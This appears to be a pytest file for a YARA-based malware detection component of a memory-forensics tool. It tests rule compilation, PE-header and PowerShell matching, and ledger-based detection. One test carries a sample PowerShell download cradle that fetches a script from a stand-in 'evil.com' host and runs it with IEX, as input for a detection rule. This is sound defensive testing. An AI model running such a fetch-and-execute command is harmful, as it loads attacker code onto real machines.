"""
Tests for YARA Scanning Engine, Provider, and Detector in Compy V2.
"""

import pytest
from pathlib import Path
import tempfile
from datetime import datetime

from fmd.v2.domain.contracts import CapabilityStatus, ProviderCapability, TriState
from fmd.v2.domain.evidence.ledger import EvidenceLedger
from fmd.v2.domain.evidence.nodes import ProcessNode, InjectedCodeNode, YaraMatchNode
from fmd.v2.domain.evidence.provenance import ProvenanceRecord
from fmd.v2.adapters.providers.yara.engine import YaraEngine, YaraCompilationError, PurePythonYaraEngine
from fmd.v2.adapters.providers.yara.scanner import YaraScannerProvider
from fmd.v2.adapters.providers.yara.detector import YaraDetector, YaraObservation

def test_pure_python_yara_compilation_and_matching(tmp_path):
    rule_file = tmp_path / "test_rule.yar"
    rule_file.write_text("""
rule Test_Malware_Sig {
    meta:
        description = "Test signature"
        severity = "HIGH"
    strings:
        $pe = { 4D 5A 90 00 }
        $cmd = "Invoke-Expression" nocase ascii
    condition:
        $pe or $cmd
}
""", encoding="utf-8")

    engine = PurePythonYaraEngine([rule_file])
    assert len(engine.rules) == 1
    assert engine.rules[0].name == "Test_Malware_Sig"

    # Match buffer 1: with PE header
    buf1 = b"\x4d\x5a\x90\x00\x00\x00\x00\x00"
    matches1 = engine.match(buf1)
    assert len(matches1) == 1
    assert matches1[0][0].name == "Test_Malware_Sig"
    assert len(matches1[0][1]) >= 1
    assert matches1[0][1][0][0] == "$pe"

    # Match buffer 2: with command string
    buf2 = b"echo 'invoke-expression test'"
    matches2 = engine.match(buf2)
    assert len(matches2) == 1

    # Buffer 3: Clean
    buf3 = b"totally benign regular buffer"
    matches3 = engine.match(buf3)
    assert len(matches3) == 0

def test_yara_invalid_syntax_fails_closed(tmp_path):
    bad_rule = tmp_path / "broken.yar"
    bad_rule.write_text("rule broken { strings: $a = condition: broken_token }", encoding="utf-8")

    with pytest.raises(YaraCompilationError):
        YaraEngine(rules_dir=str(tmp_path))

def test_yara_scanner_provider_real_starter_rules():
    # Tests the actual rules in rules/yara/
    provider = YaraScannerProvider(rules_dir="rules/yara")
    assert provider.status == CapabilityStatus.SUCCESS
    assert provider.rules_count >= 2

    # Test PE header detection in malfind preview
    matches = provider.scan_injected_artifact(
        pid=1234,
        process_name="svchost.exe",
        start_addr=0x7fff0000,
        hexdump_preview="4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00"
    )
    assert len(matches) >= 1
    assert any(m.rule_name == "Windows_PE_Header_In_Memory" for m in matches)
    assert matches[0].target_type == "INJECTED_REGION"

    # Test PowerShell download cradle detection in cmdline
    cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"(New-Object System.Net.WebClient).DownloadString('http://evil.com/p') | IEX\""
    cmd_matches = provider.scan_cmdline(pid=5678, process_name="powershell.exe", cmdline=cmd)
    assert len(cmd_matches) >= 1
    assert any(m.rule_name == "PowerShell_Memory_Download_Cradle" for m in cmd_matches)

def test_yara_detector_evaluates_ledger_nodes():
    ledger = EvidenceLedger()
    prov = ProvenanceRecord(
        _provider_id="test_prov",
        _artifact_identity="hash_abc",
        _acquisition_mode="TEST",
        acquisition_time=datetime.now()
    )

    # Add an injected code node
    inj_node = InjectedCodeNode(
        _id="inj-1",
        pid=999,
        process_name="explorer.exe",
        start_address=0x10000,
        end_address=0x20000,
        protection="PAGE_EXECUTE_READWRITE",
        hexdump_preview="4d 5a 90 00 03 00 00 00"
    )
    ledger.append_node(inj_node, prov)

    scanner = YaraScannerProvider(rules_dir="rules/yara")
    detector = YaraDetector(scanner=scanner)
    assert detector.required_capabilities() == {ProviderCapability.YARA_SCAN}

    result = detector.evaluate(ledger=ledger, graph=ledger)
    assert result.status == CapabilityStatus.SUCCESS
    assert len(result.observations) >= 1

    obs = result.observations[0]
    assert isinstance(obs, YaraObservation)
    assert obs.rule_name == "Windows_PE_Header_In_Memory"
    assert obs.target_evidence_id == "inj-1"
    assert obs.heuristic_severity >= 0.85
